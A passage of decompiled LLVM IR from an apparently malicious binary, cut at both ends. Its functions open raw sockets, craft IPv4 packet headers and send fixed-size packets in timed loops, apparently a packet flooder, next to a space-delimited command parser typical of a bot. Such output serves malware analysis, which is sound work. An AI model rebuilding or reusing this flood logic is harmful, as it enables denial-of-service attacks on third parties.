  %v0_a054 = load i32, i32* %r3.global-to-local, align 4
  %v3_a0549 = udiv i32 %v0_a054, 256
  %v1_a058 = trunc i32 %v3_a0549 to i8
  %v2_a058 = load i32, i32* %r2.global-to-local, align 4
  %v3_a058 = add i32 %v2_a058, 11
  %v4_a058 = inttoptr i32 %v3_a058 to i8*
  store i8 %v1_a058, i8* %v4_a058, align 1
  store i32 %v3_9fc0, i32* %r3.global-to-local, align 4
  store i32 %v2_9e1c, i32* %r1.global-to-local, align 4
  store i32 1500, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_a0ac = call i32 @function_fbe8(i32 %v3_9d78, i32* nonnull %stack_var_-1572, i32 1500, i32 0, i32 %v2_a07c, i32 16)
  store i32 %stack_var_-52.0, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i32 %stack_var_-52.0, 50
  br i1 %tmp, label %dec_label_pc_a0f0, label %dec_label_pc_a0bc

dec_label_pc_a0bc:                                ; preds = %dec_label_pc_9fcc
  %v2_a0c0 = call i32 @function_ce30(i32* null)
  store i32 %v2_a0c0, i32* %r1.global-to-local, align 4
  store i32 %v2_9d4c, i32* %r2.global-to-local, align 4
  store i32 %v2_a0d4, i32* %r3.global-to-local, align 4
  %v3_a0d8 = icmp ult i32 %v2_a0c0, %v2_a0d4
  br i1 %v3_a0d8, label %dec_label_pc_a0e8, label %dec_label_pc_a0e0

dec_label_pc_a0e0:                                ; preds = %dec_label_pc_a0bc
  %v1_a0e4 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_a0e8

dec_label_pc_a0e8:                                ; preds = %dec_label_pc_a0bc, %dec_label_pc_a0e0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a0f0

dec_label_pc_a0f0:                                ; preds = %dec_label_pc_9fcc, %dec_label_pc_a0e8
  %stack_var_-52.1 = phi i32 [ %stack_var_-52.0, %dec_label_pc_9fcc ], [ 0, %dec_label_pc_a0e8 ]
  %v1_a0f4 = add i32 %stack_var_-52.1, 1
  br label %dec_label_pc_9f54

dec_label_pc_a100:                                ; preds = %dec_label_pc_9d1c
  ret i32 %v1_9d5c

; uselistorder directives
  uselistorder i32 %v1_a048, { 1, 0 }
  uselistorder i32 %v0_a00c, { 1, 0 }
  uselistorder i32 %v3_9ff4, { 1, 0 }
  uselistorder i32 %v1_9fe8, { 1, 0 }
  uselistorder i32 %v3_9fc4, { 1, 0 }
  uselistorder i32 %v0_9fac, { 1, 0 }
  uselistorder i32 %v3_9fa0, { 1, 0 }
  uselistorder i32 %v1_9f94, { 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 1, 0, 2 }
  uselistorder i32 %v3_9f88, { 1, 0 }
  uselistorder i8* %v4_9fc0, { 1, 0 }
  uselistorder i32 %v4_9f2c, { 3, 4, 1, 6, 0, 2, 5, 8, 7 }
  uselistorder i32 %v1_9f28, { 1, 0 }
  uselistorder i32 %v3_9f1c, { 1, 0 }
  uselistorder i8* %tmp42, { 1, 2, 0 }
  uselistorder i32 %v2_9e1c, { 15, 1, 16, 3, 5, 17, 0, 2, 4, 6, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32 %v2_9dec, { 1, 0, 2 }
  uselistorder i32 %v2_9d4c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 9, 10, 6, 7, 8, 11, 12, 17, 18, 13, 14, 15, 16, 19, 21, 22, 20, 23, 30, 24, 26, 27, 25, 28, 29, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 0, 3, 4 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a0f0, { 1, 0 }
  uselistorder label %dec_label_pc_a0e8, { 1, 0 }
  uselistorder label %dec_label_pc_9fcc, { 1, 0 }
  uselistorder label %dec_label_pc_9dbc, { 1, 0 }
  uselistorder label %dec_label_pc_9d98, { 1, 0 }
}

define i32 @function_a110(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a110:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-116 = alloca i8, align 1
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a114 = load i32, i32* @fp, align 4
  store i32 %v3_a114, i32* %stack_var_-16, align 4
  store i32 41244, i32* %stack_var_-4, align 4
  %v13_a114 = ptrtoint i32* %stack_var_-16 to i32
  %v2_a118 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a118, i32* @fp, align 4
  %v2_a134 = ptrtoint i32* %stack_var_-264 to i32
  store i32 %v2_a134, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_161ac.126 to i32), i32* @r1, align 4
  store i32 80, i32* @r2, align 4
  %v0_a148 = call i32 @function_ef60()
  %v2_a160 = call i32 @function_ce30(i32* null)
  %v1_a170 = call i32 @function_83d8(i32 %arg2)
  %v2_a178 = icmp eq i32 %v1_a170, 0
  br i1 %v2_a178, label %dec_label_pc_a180, label %dec_label_pc_a6a4

dec_label_pc_a180:                                ; preds = %dec_label_pc_a110
  %v8_a188 = icmp sgt i32 %arg3, 2
  br i1 %v8_a188, label %dec_label_pc_a1a4, label %dec_label_pc_a18c

dec_label_pc_a18c:                                ; preds = %dec_label_pc_a180
  store i32 %arg2, i32* @r2, align 4
  %v3_a198 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_161fc.128 to i32))
  %v1_a1a0 = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_a1a4

dec_label_pc_a1a4:                                ; preds = %dec_label_pc_a180, %dec_label_pc_a18c
  %v3_a1b0 = call i32 @function_fc4c(i32 2, i32 3, i32 255)
  %v1_a1c0 = icmp slt i32 %v3_a1b0, 0
  br i1 %v1_a1c0, label %dec_label_pc_a1c8, label %dec_label_pc_a224.preheader

dec_label_pc_a1c8:                                ; preds = %dec_label_pc_a1a4
  %v1_a1cc = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_a224.preheader

dec_label_pc_a224.preheader:                      ; preds = %dec_label_pc_a1a4, %dec_label_pc_a1c8
  %v2_a1f0 = add i32 %v13_a114, -248
  %v2_a208 = add i32 %v13_a114, -60
  br label %dec_label_pc_a1dc

dec_label_pc_a1dc:                                ; preds = %dec_label_pc_a224.preheader, %dec_label_pc_a1dc
  %storemerge1516 = phi i32 [ 0, %dec_label_pc_a224.preheader ], [ %v1_a21c, %dec_label_pc_a1dc ]
  %v3_a1e8 = mul nuw nsw i32 %storemerge1516, 4
  %v2_a1f4 = add i32 %v2_a1f0, %v3_a1e8
  %v1_a1f8 = inttoptr i32 %v2_a1f4 to i32*
  %v2_a1f8 = load i32, i32* %v1_a1f8, align 4
  %v2_a20c = add i32 %v2_a208, %storemerge1516
  %v1_a214 = trunc i32 %v2_a1f8 to i8
  %v3_a214 = inttoptr i32 %v2_a20c to i8*
  store i8 %v1_a214, i8* %v3_a214, align 1
  %v1_a21c = add nuw nsw i32 %storemerge1516, 1
  %v7_a22c = icmp slt i32 %v1_a21c, 20
  br i1 %v7_a22c, label %dec_label_pc_a1dc, label %dec_label_pc_a230

dec_label_pc_a230:                                ; preds = %dec_label_pc_a1dc
  %v1_a234 = add i32 %arg4, 4
  %v1_a238 = inttoptr i32 %v1_a234 to i32*
  %v2_a238 = load i32, i32* %v1_a238, align 4
  %v2_a244 = call i32 @function_9c5c(i32 %arg2, i32 %v2_a238)
  %v1_a254 = add i32 %arg4, 12
  %v1_a258 = inttoptr i32 %v1_a254 to i32*
  %v2_a258 = load i32, i32* %v1_a258, align 4
  %v1_a260 = inttoptr i32 %v2_a258 to i8*
  %v2_a260 = call i32 @function_10868(i8* %v1_a260)
  store i32 %arg2, i32* @r2, align 4
  %v3_a284 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_16224.130 to i32))
  store i8 69, i8* %stack_var_-116, align 1
  %v1_a3b4 = add i32 %arg4, 8
  %v1_a3b8 = inttoptr i32 %v1_a3b4 to i32*
  %v2_a3b8 = load i32, i32* %v1_a3b8, align 4
  %v1_a3c0 = inttoptr i32 %v2_a3b8 to i8*
  %v2_a3c0 = call i32 @function_10868(i8* %v1_a3c0)
  %v3_a3cc = urem i32 %v2_a3c0, 65536
  %v1_a3d4 = call i32 @function_f604(i32 %v3_a3cc)
  %v2_a5c0 = ptrtoint i32* %stack_var_-96 to i32
  %v2_a5c8 = ptrtoint i32* %stack_var_-156 to i32
  %v2_a5e0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_a5e8 = ptrtoint i32* %stack_var_-136 to i32
  %v2_a610 = bitcast i32* %stack_var_-168 to i8*
  %v2_a62c = ptrtoint i32* %stack_var_-184 to i32
  %v6_a650 = bitcast i8* %stack_var_-116 to i32*
  %v2_a678 = add i32 %v2_a260, %v2_a160
  br label %dec_label_pc_a3e0

dec_label_pc_a3e0:                                ; preds = %dec_label_pc_a694, %dec_label_pc_a230
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_a230 ], [ %v1_a698, %dec_label_pc_a694 ]
  %v0_a3e0 = call i32 @function_10364()
  %v2_a3f4 = load i32, i32* %v1_a3b8, align 4
  %v1_a3fc = inttoptr i32 %v2_a3f4 to i8*
  %v2_a3fc = call i32 @function_10868(i8* %v1_a3fc)
  %v2_a404 = icmp eq i32 %v2_a3fc, 0
  br i1 %v2_a404, label %dec_label_pc_a40c, label %dec_label_pc_a418

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a3e0
  %v0_a40c = call i32 @function_10364()
  br label %dec_label_pc_a418

dec_label_pc_a418:                                ; preds = %dec_label_pc_a3e0, %dec_label_pc_a40c
  %v0_a418 = call i32 @function_8548()
  %v1_a440 = call i32 @function_f604(i32 60)
  %v0_a454 = call i32 @function_10364()
  %v3_a494 = urem i32 %v0_a3e0, 65536
  store i32 %v3_a494, i32* %stack_var_-96, align 4
  %v0_a4bc = call i32 @function_10364()
  store i32 2, i32* %stack_var_-184, align 4
  %v3_a510 = call i32 @function_8cc4(i8* nonnull %stack_var_-116, i32 20)
  %v0_a524 = call i32 @function_10364()
  store i32 %v0_a418, i32* %stack_var_-168, align 4
  %v1_a5a8 = call i32 @function_f604(i32 40)
  store i32 20, i32* @r2, align 4
  %v3_a5d8 = call i32 @function_ef50(i32 %v2_a5c0, i32 %v2_a5c8, i32 20)
  store i32 20, i32* @r2, align 4
  %v3_a5f8 = call i32 @function_ef50(i32 %v2_a5e0, i32 %v2_a5e8, i32 20)
  %v3_a610 = call i32 @function_8cc4(i8* %v2_a610, i32 52)
  store i32 60, i32* @ip, align 4
  %v7_a650 = call i32 @function_fbe8(i32 %v3_a1b0, i32* %v6_a650, i32 60, i32 0, i32 %v2_a62c, i32 16)
  %tmp = icmp ult i32 %stack_var_-56.0, 50
  br i1 %tmp, label %dec_label_pc_a694, label %dec_label_pc_a660

dec_label_pc_a660:                                ; preds = %dec_label_pc_a418
  %v2_a664 = call i32 @function_ce30(i32* null)
  %v3_a67c = icmp ult i32 %v2_a664, %v2_a678
  br i1 %v3_a67c, label %dec_label_pc_a68c, label %dec_label_pc_a684

dec_label_pc_a684:                                ; preds = %dec_label_pc_a660
  %v1_a688 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_a68c

dec_label_pc_a68c:                                ; preds = %dec_label_pc_a660, %dec_label_pc_a684
  br label %dec_label_pc_a694

dec_label_pc_a694:                                ; preds = %dec_label_pc_a418, %dec_label_pc_a68c
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_a418 ], [ 0, %dec_label_pc_a68c ]
  %v1_a698 = add i32 %stack_var_-56.1, 1
  br label %dec_label_pc_a3e0

dec_label_pc_a6a4:                                ; preds = %dec_label_pc_a110
  ret i32 %v1_a170

; uselistorder directives
  uselistorder i32 %stack_var_-56.0, { 1, 0 }
  uselistorder i32 %storemerge1516, { 2, 0, 1 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %stack_var_-116, { 1, 0, 2 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_a694, { 1, 0 }
  uselistorder label %dec_label_pc_a68c, { 1, 0 }
  uselistorder label %dec_label_pc_a418, { 1, 0 }
  uselistorder label %dec_label_pc_a1dc, { 1, 0 }
  uselistorder label %dec_label_pc_a224.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_a1a4, { 1, 0 }
}

define i32 @function_a6b8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a6b8:
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-112 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  store i32 42692, i32* %stack_var_-4, align 4
  %v2_a6c0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_a6c0, i32* @fp, align 4
  %v2_a6e8 = call i32 @function_ce30(i32* null)
  %v1_a6f8 = call i32 @function_83d8(i32 %arg2)
  %v2_a700 = icmp eq i32 %v1_a6f8, 0
  br i1 %v2_a700, label %dec_label_pc_a708, label %dec_label_pc_ab8c

dec_label_pc_a708:                                ; preds = %dec_label_pc_a6b8
  %v8_a710 = icmp sgt i32 %arg3, 1
  br i1 %v8_a710, label %dec_label_pc_a72c, label %dec_label_pc_a714

dec_label_pc_a714:                                ; preds = %dec_label_pc_a708
  store i32 %arg2, i32* @r2, align 4
  %v3_a720 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1623c.132 to i32))
  %v1_a728 = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a708, %dec_label_pc_a714
  %v1_a730 = add i32 %arg4, 8
  %v1_a734 = inttoptr i32 %v1_a730 to i32*
  %v2_a734 = load i32, i32* %v1_a734, align 4
  %v1_a73c = inttoptr i32 %v2_a734 to i8*
  %v2_a73c = call i32 @function_10868(i8* %v1_a73c)
  %v3_a754 = call i32 @function_fc4c(i32 2, i32 3, i32 255)
  %v1_a764 = icmp slt i32 %v3_a754, 0
  br i1 %v1_a764, label %dec_label_pc_a76c, label %dec_label_pc_a774

dec_label_pc_a76c:                                ; preds = %dec_label_pc_a72c
  %v1_a770 = call i32 @function_10a14(i32 1)
  br label %dec_label_pc_a774

dec_label_pc_a774:                                ; preds = %dec_label_pc_a72c, %dec_label_pc_a76c
  %v2_a778 = call i32 @function_ce30(i32* null)
  store i32 %v2_a778, i32* @r4, align 4
  %v0_a780 = call i32 @function_cd2c()
  %v0_a788 = load i32, i32* @r4, align 4
  %v2_a788 = xor i32 %v0_a788, %v0_a780
  %v1_a790 = call i32 @function_10508(i32 %v2_a788)
  %v0_a794 = call i32 @function_10364()
  %v2_a7a0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 1400, i32* @r2, align 4
  %v2_a7b0 = bitcast i32* %stack_var_-72 to i8*
  %v3_a7b0 = call i32 @function_ef70(i8* %v2_a7b0, i32 %v0_a794)
  %v1_a7b8 = add i32 %arg4, 4
  %v1_a7bc = inttoptr i32 %v1_a7b8 to i32*
  %v2_a7bc = load i32, i32* %v1_a7bc, align 4
  %v2_a7c8 = call i32 @function_9c5c(i32 %arg2, i32 %v2_a7bc)
  store i32 %arg2, i32* @r2, align 4
  %v3_a7ec = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_16260.134 to i32))
  %v2_aaa0 = ptrtoint i32* %stack_var_-92 to i32
  %v2_aaa8 = ptrtoint i32* %stack_var_-152 to i32
  %v2_aac8 = ptrtoint i32* %stack_var_-132 to i32
  %v2_aaf0 = bitcast i32* %stack_var_-164 to i8*
  %v2_ab0c = ptrtoint i32* %stack_var_-180 to i32
  %v6_ab30 = bitcast i8* %stack_var_-112 to i32*
  %v2_ab58 = add i32 %v2_a73c, %v2_a6e8
  br label %dec_label_pc_a7f0

dec_label_pc_a7f0:                                ; preds = %dec_label_pc_ab6c, %dec_label_pc_a774
  %stack_var_-44.0 = phi i32 [ %tmp21, %dec_label_pc_a774 ], [ %v1_ab70, %dec_label_pc_ab6c ]
  %v0_a7f0 = call i32 @function_8548()
  store i8 69, i8* %stack_var_-112, align 1
  %v1_a860 = call i32 @function_f604(i32 1440)
  %v0_a874 = call i32 @function_10364()
  %v0_a8cc = call i32 @function_10364()
  %v3_a8d8 = urem i32 %v0_a8cc, 65536
  store i32 %v3_a8d8, i32* %stack_var_-92, align 4
  %v0_a8e8 = call i32 @function_10364()
  %v0_a904 = call i32 @function_10364()
  %v0_a910 = call i32 @function_10364()
  store i32 2, i32* %stack_var_-180, align 4
  %v3_aa20 = call i32 @function_8cc4(i8* nonnull %stack_var_-112, i32 20)
  %v3_aa40 = call i32 @function_8cc4(i8* nonnull %stack_var_-112, i32 40)
  store i32 %v0_a7f0, i32* %stack_var_-164, align 4
  %v1_aa88 = call i32 @function_f604(i32 1420)
  store i32 20, i32* @r2, align 4
  %v3_aab8 = call i32 @function_ef50(i32 %v2_aaa0, i32 %v2_aaa8, i32 20)
  store i32 1400, i32* @r2, align 4
  %v3_aad8 = call i32 @function_ef50(i32 %v2_a7a0, i32 %v2_aac8, i32 1400)
  %v3_aaf0 = call i32 @function_8cc4(i8* %v2_aaf0, i32 1432)
  store i32 1440, i32* @ip, align 4
  %v7_ab30 = call i32 @function_fbe8(i32 %v3_a754, i32* %v6_ab30, i32 1440, i32 0, i32 %v2_ab0c, i32 16)
  %tmp = icmp ult i32 %stack_var_-44.0, 50
  br i1 %tmp, label %dec_label_pc_ab6c, label %dec_label_pc_ab40

dec_label_pc_ab40:                                ; preds = %dec_label_pc_a7f0
  %v2_ab44 = call i32 @function_ce30(i32* null)
  %v3_ab5c = icmp ult i32 %v2_ab44, %v2_ab58
  br i1 %v3_ab5c, label %dec_label_pc_ab64, label %dec_label_pc_ab7c

dec_label_pc_ab64:                                ; preds = %dec_label_pc_ab40
  br label %dec_label_pc_ab6c

dec_label_pc_ab6c:                                ; preds = %dec_label_pc_a7f0, %dec_label_pc_ab64
  %stack_var_-44.1 = phi i32 [ %stack_var_-44.0, %dec_label_pc_a7f0 ], [ 0, %dec_label_pc_ab64 ]
  %v1_ab70 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_a7f0

dec_label_pc_ab7c:                                ; preds = %dec_label_pc_ab40
  %v1_ab80 = call i32 @function_cbe4(i32 %v3_a754)
  %v1_ab88 = call i32 @function_10a14(i32 0)
  br label %dec_label_pc_ab8c

dec_label_pc_ab8c:                                ; preds = %dec_label_pc_a6b8, %dec_label_pc_ab7c
  %v12_ab90 = phi i32 [ %v1_a6f8, %dec_label_pc_a6b8 ], [ %v1_ab88, %dec_label_pc_ab7c ]
  ret i32 %v12_ab90

; uselistorder directives
  uselistorder i32 %stack_var_-44.0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %stack_var_-112, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0 }
  uselistorder i8 69, { 1, 2, 0 }
  uselistorder i32 ()* @function_8548, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_9c5c, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_83d8, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ab8c, { 1, 0 }
  uselistorder label %dec_label_pc_ab6c, { 1, 0 }
  uselistorder label %dec_label_pc_a774, { 1, 0 }
  uselistorder label %dec_label_pc_a72c, { 1, 0 }
}

define i32 @function_b84c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b84c:
  %stack_var_-4 = alloca i32, align 4
  store i32 47192, i32* %stack_var_-4, align 4
  %v2_b854 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b854, i32* @fp, align 4
  %v2_b86c = load i32, i32* @global_var_22dbc.187, align 4
  store i32 %v2_b86c, i32* @r2, align 4
  %v3_b87c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_16a2c.208 to i32))
  %v2_b884 = load i32, i32* @global_var_22ed0.185, align 4
  store i32 %v2_b884, i32* @r2, align 4
  %v3_b898 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_16a3c.213 to i32))
  %v2_b8a0 = load i32, i32* @global_var_22dbc.187, align 4
  store i32 %v2_b8a0, i32* @r2, align 4
  %v3_b8b0 = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_16a4c.215 to i32))
  ret i32 %v3_b8b0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @function_b8d4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b8d4:
  %stack_var_-4 = alloca i32, align 4
  store i32 47328, i32* %stack_var_-4, align 4
  %v2_b8dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b8dc, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v3_b8fc = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_16a54.217 to i32))
  ret i32 %v3_b8fc

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_b90c(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_b90c:
  %stack_var_-40 = alloca i8, align 1
  %stack_var_-52 = alloca i8*, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 47384, i32* %stack_var_-4, align 4
  %v2_b914 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b914, i32* @fp, align 4
  store i8* %arg3, i8** %stack_var_-52, align 4
  br label %dec_label_pc_b95c.preheader

dec_label_pc_b944:                                ; preds = %dec_label_pc_b974
  %v1_b948 = add i32 %.pre, 1
  %v5_b94c = inttoptr i32 %v1_b948 to i8*
  %v1_b954 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_b95c

dec_label_pc_b95c:                                ; preds = %dec_label_pc_b95c.preheader, %dec_label_pc_b944
  %stack_var_-36.0 = phi i32 [ %v1_b954, %dec_label_pc_b944 ], [ %stack_var_-36.119, %dec_label_pc_b95c.preheader ]
  %stack_var_-28.0 = phi i8* [ %v5_b94c, %dec_label_pc_b944 ], [ %stack_var_-28.120, %dec_label_pc_b95c.preheader ]
  %v3_b960 = load i8*, i8** %stack_var_-52, align 4
  %v4_b960 = ptrtoint i8* %v3_b960 to i32
  store i32 %v4_b960, i32* @r0, align 4
  %v0_b964 = call i32 @function_f030()
  %v3_b96c = icmp ult i32 %stack_var_-36.0, %v0_b964
  %.pre = ptrtoint i8* %stack_var_-28.0 to i32
  br i1 %v3_b96c, label %dec_label_pc_b974, label %dec_label_pc_b984

dec_label_pc_b974:                                ; preds = %dec_label_pc_b95c
  %v2_b978 = load i8, i8* %stack_var_-28.0, align 1
  %v7_b97c = icmp eq i8 %v2_b978, 32
  br i1 %v7_b97c, label %dec_label_pc_b984, label %dec_label_pc_b944

dec_label_pc_b984:                                ; preds = %dec_label_pc_b95c, %dec_label_pc_b974
  %v1_b988 = add i32 %.pre, 1
  %v3_b994 = load i8*, i8** %stack_var_-52, align 4
  %v4_b994 = ptrtoint i8* %v3_b994 to i32
  store i32 %v4_b994, i32* @r0, align 4
  %v0_b998 = call i32 @function_f030()
  %v9_b9a0 = icmp eq i32 %stack_var_-36.0, %v0_b998
  br i1 %v9_b9a0, label %dec_label_pc_bc24, label %dec_label_pc_b9a8

dec_label_pc_b9a8:                                ; preds = %dec_label_pc_b984
  %v5_b98c = inttoptr i32 %v1_b988 to i8*
  %v1_b9ac = add nuw nsw i32 %storemerge921, 1
  %v7_b9bc = icmp slt i32 %v1_b9ac, 5
  br i1 %v7_b9bc, label %dec_label_pc_b95c.preheader, label %dec_label_pc_b9d8

dec_label_pc_b95c.preheader:                      ; preds = %dec_label_pc_b90c, %dec_label_pc_b9a8
  %storemerge921 = phi i32 [ 0, %dec_label_pc_b90c ], [ %v1_b9ac, %dec_label_pc_b9a8 ]
  %stack_var_-28.120 = phi i8* [ %arg3, %dec_label_pc_b90c ], [ %v5_b98c, %dec_label_pc_b9a8 ]
  %stack_var_-36.119 = phi i32 [ 0, %dec_label_pc_b90c ], [ %stack_var_-36.0, %dec_label_pc_b9a8 ]
  br label %dec_label_pc_b95c

dec_label_pc_b9cc:                                ; preds = %dec_label_pc_b9f0
  %v1_b9d0 = add i32 %storemerge10, 1
  br label %dec_label_pc_b9d8

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9a8, %dec_label_pc_b9cc
  %storemerge10 = phi i32 [ %v1_b9d0, %dec_label_pc_b9cc ], [ 0, %dec_label_pc_b9a8 ]
  store i32 %storemerge10, i32* @r4, align 4
  store i32 %v1_b988, i32* @r0, align 4
  %v0_b9e0 = call i32 @function_f030()
  %v0_b9e8 = load i32, i32* @r4, align 4
  %v3_b9e8 = icmp ult i32 %v0_b9e8, %v0_b9e0
  br i1 %v3_b9e8, label %dec_label_pc_b9f0, label %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge

dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge:    ; preds = %dec_label_pc_b9d8
  %.pre27 = add i32 %storemerge10, %v1_b988
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_ba0c

dec_label_pc_b9f0:                                ; preds = %dec_label_pc_b9d8
  %v2_b9fc = add i32 %storemerge10, %v1_b988
  %v1_ba00 = inttoptr i32 %v2_b9fc to i8*
  %v2_ba00 = load i8, i8* %v1_ba00, align 1
  %v7_ba04 = icmp eq i8 %v2_ba00, 32
  br i1 %v7_ba04, label %dec_label_pc_ba0c, label %dec_label_pc_b9cc

dec_label_pc_ba0c:                                ; preds = %dec_label_pc_b9f0, %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge
  %v3_ba20.pre-phi = phi i8* [ %.pre28, %dec_label_pc_b9d8.dec_label_pc_ba0c_crit_edge ], [ %v1_ba00, %dec_label_pc_b9f0 ]
  store i8 0, i8* %v3_ba20.pre-phi, align 1
  %v2_ba28 = load i32, i32* @global_var_22dbc.187, align 4
  %v4_ba34 = call i32 @function_f464(i8* %v5_b98c, i32 %v2_ba28)
  %v2_ba3c = icmp eq i32 %v4_ba34, 0
  br i1 %v2_ba3c, label %dec_label_pc_ba44, label %dec_label_pc_bc24

dec_label_pc_ba44:                                ; preds = %dec_label_pc_ba0c
  %v2_ba48 = load i32, i32* @global_var_20644.35, align 4
  %v2_ba4c = icmp eq i32 %v2_ba48, 0
  br i1 %v2_ba4c, label %dec_label_pc_ba54, label %dec_label_pc_bc24

dec_label_pc_ba54:                                ; preds = %dec_label_pc_ba44
  %v3_ba54 = load i8*, i8** %stack_var_-52, align 4
  br label %dec_label_pc_ba88.preheader

dec_label_pc_ba70:                                ; preds = %dec_label_pc_baa0
  %v1_ba74 = add i32 %.pre29, 1
  %v5_ba78 = inttoptr i32 %v1_ba74 to i8*
  %v1_ba80 = add i32 %stack_var_-36.2, 1
  br label %dec_label_pc_ba88

dec_label_pc_ba88:                                ; preds = %dec_label_pc_ba88.preheader, %dec_label_pc_ba70
  %stack_var_-36.2 = phi i32 [ %v1_ba80, %dec_label_pc_ba70 ], [ %stack_var_-36.316, %dec_label_pc_ba88.preheader ]
  %stack_var_-28.2 = phi i8* [ %v5_ba78, %dec_label_pc_ba70 ], [ %stack_var_-28.317, %dec_label_pc_ba88.preheader ]
  %v3_ba8c = load i8*, i8** %stack_var_-52, align 4
  %v4_ba8c = ptrtoint i8* %v3_ba8c to i32
  store i32 %v4_ba8c, i32* @r0, align 4
  %v0_ba90 = call i32 @function_f030()
  %v3_ba98 = icmp ult i32 %stack_var_-36.2, %v0_ba90
  %.pre29 = ptrtoint i8* %stack_var_-28.2 to i32
  br i1 %v3_ba98, label %dec_label_pc_baa0, label %dec_label_pc_bab0

dec_label_pc_baa0:                                ; preds = %dec_label_pc_ba88
  %v2_baa4 = load i8, i8* %stack_var_-28.2, align 1
  %v7_baa8 = icmp eq i8 %v2_baa4, 32
  br i1 %v7_baa8, label %dec_label_pc_bab0, label %dec_label_pc_ba70

dec_label_pc_bab0:                                ; preds = %dec_label_pc_ba88, %dec_label_pc_baa0
  %v1_bab4 = add i32 %.pre29, 1
